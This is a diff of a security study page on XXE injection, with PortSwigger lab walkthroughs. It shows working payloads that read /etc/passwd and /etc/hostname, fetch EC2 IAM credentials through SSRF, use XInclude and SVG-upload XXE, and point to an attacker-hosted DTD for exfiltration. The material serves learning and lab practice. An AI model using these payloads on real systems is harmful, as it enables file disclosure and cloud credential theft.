@@ -1,6 +1,6 @@
 # XXE (XML External Entity)
 
-## What is XXE&#x20;
+## What is XXE
 
 XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.
 
@@ -79,14 +79,14 @@ Ex: Below is given an XML document that uses `note.dtd`
 
 So now let's understand how that DTD validates the XML. Here's what all those terms used in `note.dtd` mean
 
-* !DOCTYPE note -  Defines a root element of the document named **note**
+* !DOCTYPE note - Defines a root element of the document named **note**
 * !ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
 * !ELEMENT to - Defines the `to` element to be of type "#PCDATA"
 * !ELEMENT from - Defines the `from` element to be of type "#PCDATA"
-* !ELEMENT heading  - Defines the `heading` element to be of type "#PCDATA"
+* !ELEMENT heading - Defines the `heading` element to be of type "#PCDATA"
 * !ELEMENT body - Defines the `body` element to be of type "#PCDATA"
 
-&#x20;   NOTE: #PCDATA means parseable character data.
+NOTE: #PCDATA means parseable character data.
 
 ## XXE Attacks
 
@@ -248,7 +248,7 @@ This DTD carries out the following steps:
 
 The attacker must then host the malicious DTD on a system that they control, normally by loading it onto their own webserver. For example, the attacker might serve the malicious DTD at the following URL:
 
-` http://web-attacker.com/malicious.dtd`
+`http://web-attacker.com/malicious.dtd`
 
 Finally, the attacker must submit the following XXE payload to the vulnerable application:
 
@@ -306,11 +306,9 @@ Here again, we are defining an ENTITY with the name `read` but the difference is
   * [https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/](https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/)
 * SOAP Requests are also just XML requests
 
-## Examples
+## PortSwigger Labs
 
-### PortSwigger Labs
-
-#### Exploiting XXE using external entities to retrieve files
+### Exploiting XXE using external entities to retrieve files
 
 > This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
 >
@@ -328,7 +326,7 @@ Payload used when editing and re-sending the request
 <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]><stockCheck><productId>&read;</productId><storeId>1</storeId></stockCheck>
 ```
 
-#### Exploiting XXE to perform SSRF attacks
+### Exploiting XXE to perform SSRF attacks
 
 > The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
 >
@@ -346,7 +344,7 @@ Payload used when editing and re-sending the request after iteratively appending
 <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]> <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
 ```
 
-#### Exploiting XInclude to retrieve files
+### Exploiting XInclude to retrieve files
 
 > Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.
 >
@@ -364,7 +362,7 @@ Payload use after replacing the `productId=` parameter with the payload
 productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
 ```
 
-#### Exploiting XXE via image file upload
+### Exploiting XXE via image file upload
 
 > This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.
 >
@@ -378,7 +376,7 @@ Created an .svg file with the below payload then used that as the uploaded avata
 <?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="Verdana" font-size="16" x="0" y="16">&xxe;</text></svg>
 ```
 
-#### Blind XXE with out-of-band interaction
+### Blind XXE with out-of-band interaction
 
 > You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain. Use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
 
@@ -406,7 +404,7 @@ Updated the intercepted request updating the body with the below payload
 
 In the Burp Collaborator client window click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
 
-#### Exploiting blind XXE to exfiltrate data using a malicious external DTD
+### Exploiting blind XXE to exfiltrate data using a malicious external DTD
 
 > This lab has a "Check stock" feature that parses XML input but does not display the result.
 >
